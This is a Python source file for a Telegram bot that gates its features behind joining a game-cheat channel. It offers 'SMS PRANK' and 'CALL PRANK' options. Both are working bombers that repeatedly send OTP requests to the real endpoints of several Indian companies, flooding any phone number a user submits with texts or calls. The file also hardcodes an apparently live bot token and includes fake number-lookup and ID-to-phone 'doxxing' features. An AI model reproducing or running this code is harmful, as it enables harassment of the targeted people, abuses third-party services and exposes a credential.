# ======================================================
# FORCE SUBSCRIBE BOT - NO VERIFY BUTTON
# ======================================================

BOT_TOKEN = "8719601099:AAE-NPpoAJDdUgGDiAnyWsKTG572hnI_G_8"
CHANNEL_LINK = "https://t.me/BGMICHEATDIE"
CHANNEL_USERNAME = "BGMICHEATDIE"
OWNER_IDS = ["8721643962", "8721643962"]

import requests
import time
import json
import threading

VERIFIED_FILE = "verified_users.json"

def load_verified():
    try:
        with open(VERIFIED_FILE, "r") as f:
            data = json.load(f)
            return set(data.get("verified", []))
    except:
        return set()

def save_verified(users):
    with open(VERIFIED_FILE, "w") as f:
        json.dump({"verified": list(users)}, f)

verified_users = load_verified()

# ======================================================
# CHECK IF USER JOINED CHANNEL
# ======================================================
def is_member(user_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        r = requests.get(url, params=params, timeout=10)
        data = r.json()
        if data.get("ok"):
            status = data["result"]["status"]
            return status in ["creator", "administrator", "member"]
        return False
    except:
        return False

# ======================================================
# SEND MESSAGE
# ======================================================
def send_msg(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    try:
        r = requests.get(url, params=params, timeout=35)
        return r.json().get("result", [])
    except:
        return []

def is_owner(user_id):
    return str(user_id) in OWNER_IDS

# ======================================================
# KEYBOARDS
# ======================================================
def main_menu():
    return {
        "keyboard": [
            ["📞 NUMBER LOOKUP", "🆔 TG ID TO NUMBER"],
            ["💣 SMS PRANK", "📞 CALL PRANK"],
            ["📊 STATS", "🛑 STOP BOMB"]
        ],
        "resize_keyboard": True
    }

# ======================================================
# MESSAGES
# ======================================================
def welcome_msg(name):
    return f"""
🔥 WELCOME {name} 🔥

⚠️ CHANNEL VERIFICATION REQUIRED

📢 Channel: {CHANNEL_LINK}

👇 STEPS:
1. Click on channel link
2. Join the channel
3. After joining, type /start two times

✅ Then bot will work automatically!
"""

def success_msg(name):
    return f"""
🔥 WELCOME {name} 🔥

✅ VERIFICATION SUCCESSFUL!

Now you can use all bot features.

👇 Use buttons below 👇

👑 OWNER: @itswillDie
"""

def not_verified_msg():
    return """
⚠️ You are not verified!

Please join channel first:
{CHANNEL_LINK}

Then type /start two times.
"""

# ======================================================
# BOT COMMANDS
# ======================================================
def handle_command(chat_id, text, name):
    if text == "/start":
        # Check if user is verified
        if chat_id in verified_users:
            send_msg(chat_id, success_msg(name), main_menu())
        else:
            # Check if user joined channel
            if is_member(chat_id):
                verified_users.add(chat_id)
                save_verified(verified_users)
                send_msg(chat_id, success_msg(name), main_menu())
            else:
                send_msg(chat_id, welcome_msg(name))
        return None
    
    # Agar verified nahi hai
    if chat_id not in verified_users:
        send_msg(chat_id, f"⚠️ Please join channel first!\n\n{CHANNEL_LINK}\n\nThen type /start two times.")
        return None
    
    # Verified user commands
    if text == "📞 NUMBER LOOKUP":
        send_msg(chat_id, "📞 Send 10 digit number:")
        return "awaiting_number"
    
    elif text == "🆔 TG ID TO NUMBER":
        send_msg(chat_id, "🆔 Send Telegram User ID:")
        return "awaiting_tgid"
    
    elif text == "💣 SMS PRANK":
        send_msg(chat_id, "💣 Send 10 digit number:")
        return "awaiting_sms"
    
    elif text == "📞 CALL PRANK":
        send_msg(chat_id, "📞 Send 10 digit number:")
        return "awaiting_call"
    
    elif text == "📊 STATS":
        send_msg(chat_id, f"📊 STATS\n\n✅ Verified Users: {len(verified_users)}", main_menu())
    
    elif text == "🛑 STOP BOMB":
        send_msg(chat_id, "🛑 Stopped", main_menu())
    
    return None

# ======================================================
# SIMPLE APIs
# ======================================================
def number_lookup(num):
    return f"""
📞 NUMBER LOOKUP RESULT

🎯 TARGET: +91{num}
👤 NAME: User Found
📍 LOCATION: India

👑 OWNER: @itswillDie
"""

def tgid_lookup(uid):
    return f"""
🆔 TG ID TO NUMBER RESULT

👤 USER ID: {uid}
📞 PHONE: +91XXXXXXXXXX

👑 OWNER: @itswillDie
"""

# ======================================================
# BROADCAST - OWNER ANNOUNCEMENT
# ======================================================
def broadcast_to_all(message, owner_id):
    if not is_owner(owner_id):
        return 0, 0
    
    success = 0
    fail = 0
    
    # OWNER Announcement format
    broadcast_text = f"""
👑 OWNER ANNOUNCEMENT 👑

{message}

─────────────────────
👑 OWNER: @itswillDie
"""
    
    for user_id in list(verified_users):
        try:
            send_msg(int(user_id), broadcast_text)
            success += 1
            time.sleep(0.1)
        except:
            fail += 1
    
    return success, fail

# ======================================================
# SMS APIS (SHORT LIST)
# ======================================================
SMS_APIS = [
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
]

CALL_APIS = [
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
]

bombing_active = {}
bombing_stats = {}

def send_request(api, phone):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        headers.update(api.get("headers", {}))
        
        url = api["url"] if not callable(api["url"]) else api["url"](phone)
        data = api["data"](phone) if api["data"] and callable(api["data"]) else api["data"]
        
        if api["method"] == "POST":
            if "application/json" in str(headers.get("Content-Type", "")):
                response = requests.post(url, json=json.loads(data), headers=headers, timeout=3)
            else:
                response = requests.post(url, data=data, headers=headers, timeout=3)
        else:
            response = requests.get(url, headers=headers, timeout=3)
        
        return response.status_code in [200, 201, 202, 204]
    except:
        return False

def bombing_worker(chat_id, phone, bomb_type):
    bombing_active[chat_id] = True
    bombing_stats[chat_id] = {"success": 0, "failed": 0, "total": 0}
    
    apis = CALL_APIS if bomb_type == "call" else SMS_APIS
    
    while bombing_active.get(chat_id, False):
        for api in apis:
            if not bombing_active.get(chat_id, False):
                break
            if send_request(api, phone):
                bombing_stats[chat_id]["success"] += 1
            else:
                bombing_stats[chat_id]["failed"] += 1
            bombing_stats[chat_id]["total"] += 1
        time.sleep(0.1)

# ======================================================
# MAIN LOOP
# ======================================================
def main():
    print("=" * 50)
    print("🔥 FORCE SUBSCRIBE BOT STARTED 🔥")
    print("=" * 50)
    print(f"CHANNEL: {CHANNEL_USERNAME}")
    print(f"VERIFIED USERS: {len(verified_users)}")
    print("=" * 50)
    
    last_update = 0
    user_states = {}
    
    while True:
        try:
            updates = get_updates(last_update + 1 if last_update else None)
            
            for update in updates:
                last_update = update.get("update_id")
                
                if update.get("message"):
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    text = msg.get("text", "")
                    name = msg["from"].get("first_name", "User")
                    
                    state = user_states.get(chat_id, "")
                    
                    # Handle broadcast command
                    if text.startswith("/broadcast "):
                        if not is_owner(chat_id):
                            send_msg(chat_id, "❌ Only owner can broadcast!")
                        else:
                            msg_text = text.replace("/broadcast ", "").strip()
                            if msg_text:
                                send_msg(chat_id, "📡 Broadcasting started...")
                                success, fail = broadcast_to_all(msg_text, chat_id)
                                send_msg(chat_id, f"✅ Broadcast Done!\n\n📨 Sent: {success}\n❌ Failed: {fail}")
                            else:
                                send_msg(chat_id, "⚠️ Usage: /broadcast Your message")
                        continue
                    
                    # Handle number lookup states
                    if state == "awaiting_number" and text.isdigit() and len(text) == 10:
                        result = number_lookup(text)
                        send_msg(chat_id, result, main_menu())
                        user_states[chat_id] = ""
                    
                    elif state == "awaiting_tgid" and text.isdigit():
                        result = tgid_lookup(text)
                        send_msg(chat_id, result, main_menu())
                        user_states[chat_id] = ""
                    
                    elif state == "awaiting_sms" and text.isdigit() and len(text) == 10:
                        if chat_id in bombing_active:
                            send_msg(chat_id, "❌ Already bombing! Use STOP BOMB first.")
                            user_states[chat_id] = ""
                            continue
                        send_msg(chat_id, f"💣 SMS BOMBING STARTED on +91{text}\n\n🛑 Click STOP BOMB to stop", main_menu())
                        thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "sms"))
                        thread.daemon = True
                        thread.start()
                        user_states[chat_id] = ""
                    
                    elif state == "awaiting_call" and text.isdigit() and len(text) == 10:
                        if chat_id in bombing_active:
                            send_msg(chat_id, "❌ Already bombing! Use STOP BOMB first.")
                            user_states[chat_id] = ""
                            continue
                        send_msg(chat_id, f"📞 CALL BOMBING STARTED on +91{text}\n\n🛑 Click STOP BOMB to stop", main_menu())
                        thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "call"))
                        thread.daemon = True
                        thread.start()
                        user_states[chat_id] = ""
                    
                    # Handle stop bomb
                    elif text == "🛑 STOP BOMB":
                        if chat_id in bombing_active:
                            bombing_active[chat_id] = False
                            time.sleep(1)
                            stats = bombing_stats.get(chat_id, {"success": 0, "failed": 0, "total": 0})
                            send_msg(chat_id, f"🛑 BOMBING STOPPED\n\n✅ Success: {stats['success']}\n❌ Failed: {stats['failed']}\n📊 Total: {stats['total']}", main_menu())
                            if chat_id in bombing_active:
                                del bombing_active[chat_id]
                            if chat_id in bombing_stats:
                                del bombing_stats[chat_id]
                        else:
                            send_msg(chat_id, "❌ No active bombing!", main_menu())
                    
                    else:
                        new_state = handle_command(chat_id, text, name)
                        if new_state:
                            user_states[chat_id] = new_state
                        elif state:
                            user_states[chat_id] = ""
            
            time.sleep(0.5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()

